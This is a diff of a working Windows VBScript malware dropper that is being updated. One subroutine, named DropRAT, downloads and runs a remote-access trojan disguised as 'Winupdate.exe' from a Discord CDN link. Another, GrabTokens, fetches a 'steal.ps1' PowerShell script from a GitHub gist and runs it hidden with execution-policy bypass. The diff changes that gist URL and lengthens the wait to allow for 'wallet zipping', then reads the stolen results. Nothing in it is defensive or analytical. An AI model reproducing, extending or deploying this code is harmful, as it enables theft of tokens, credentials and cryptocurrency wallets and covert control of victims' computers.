@@ -49,7 +49,6 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -217,7 +216,7 @@ End Sub
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/172084531c9168c0fe4b4cacc5bb0a45/raw/127a7a0f6723e9b88492fe4c7e5e533e140b1d06/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/804deb0fdfd16c194dee849f33a90f70fb93f016/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
@@ -227,8 +226,8 @@ Sub GrabTokens(targetWH)
     WriteFile psf, pc
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     
-    ' Wait 10 seconds for PowerShell to finish
-    Call SleepSeconds(10)
+    ' Wait 15 seconds for PowerShell to finish (it takes longer with wallet zipping)
+    Call SleepSeconds(15)
     
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
